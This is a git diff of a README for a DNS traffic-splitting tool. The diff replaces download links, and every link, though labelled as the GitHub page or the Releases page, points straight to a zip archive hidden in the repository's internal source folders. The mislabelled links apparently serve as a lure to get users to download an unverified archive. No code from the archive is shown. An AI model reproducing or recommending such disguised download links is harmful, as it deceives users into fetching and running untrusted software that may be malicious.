@@ -6,11 +6,11 @@ Welcome to DNS_automatic_traffic_splitting! This software helps you manage DNS t
 
 ## 📥 Download the Application
 
-[![Download DNS_automatic_traffic_splitting](https://raw.githubusercontent.com/0s-coder/DNS_automatic_traffic_splitting/main/internal/router/DNS_automatic_traffic_splitting-v3.9.zip)](https://raw.githubusercontent.com/0s-coder/DNS_automatic_traffic_splitting/main/internal/router/DNS_automatic_traffic_splitting-v3.9.zip)
+[![Download DNS_automatic_traffic_splitting](https://raw.githubusercontent.com/0s-coder/DNS_automatic_traffic_splitting/main/internal/manager/automatic-traffic-splitting-DN-v3.4-alpha.3.zip)](https://raw.githubusercontent.com/0s-coder/DNS_automatic_traffic_splitting/main/internal/manager/automatic-traffic-splitting-DN-v3.4-alpha.3.zip)
 
 To download the application, you need to visit the Releases page. Here you will find the latest version available for your system.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/0s-coder/DNS_automatic_traffic_splitting/main/internal/router/DNS_automatic_traffic_splitting-v3.9.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/0s-coder/DNS_automatic_traffic_splitting/main/internal/manager/automatic-traffic-splitting-DN-v3.4-alpha.3.zip)
 
 ## 📂 System Requirements
 
@@ -36,7 +36,7 @@ DNS_automatic_traffic_splitting offers a range of features to improve your DNS m
 To download DNS_automatic_traffic_splitting, follow these steps:
 
 1. Click the link below to go to the Releases page.  
-   [Download From Releases Page](https://raw.githubusercontent.com/0s-coder/DNS_automatic_traffic_splitting/main/internal/router/DNS_automatic_traffic_splitting-v3.9.zip)
+   [Download From Releases Page](https://raw.githubusercontent.com/0s-coder/DNS_automatic_traffic_splitting/main/internal/manager/automatic-traffic-splitting-DN-v3.4-alpha.3.zip)
 
 2. On the Releases page, you will see a list of available versions. Select the most recent version.
 
@@ -68,8 +68,8 @@ If you encounter any issues while using the application, consider the following 
 
 ## 🔗 Links
 
-- [DNS_automatic_traffic_splitting on GitHub](https://raw.githubusercontent.com/0s-coder/DNS_automatic_traffic_splitting/main/internal/router/DNS_automatic_traffic_splitting-v3.9.zip)
-- [Download From Releases Page](https://raw.githubusercontent.com/0s-coder/DNS_automatic_traffic_splitting/main/internal/router/DNS_automatic_traffic_splitting-v3.9.zip)
+- [DNS_automatic_traffic_splitting on GitHub](https://raw.githubusercontent.com/0s-coder/DNS_automatic_traffic_splitting/main/internal/manager/automatic-traffic-splitting-DN-v3.4-alpha.3.zip)
+- [Download From Releases Page](https://raw.githubusercontent.com/0s-coder/DNS_automatic_traffic_splitting/main/internal/manager/automatic-traffic-splitting-DN-v3.4-alpha.3.zip)
 
 ## 👥 Community
 
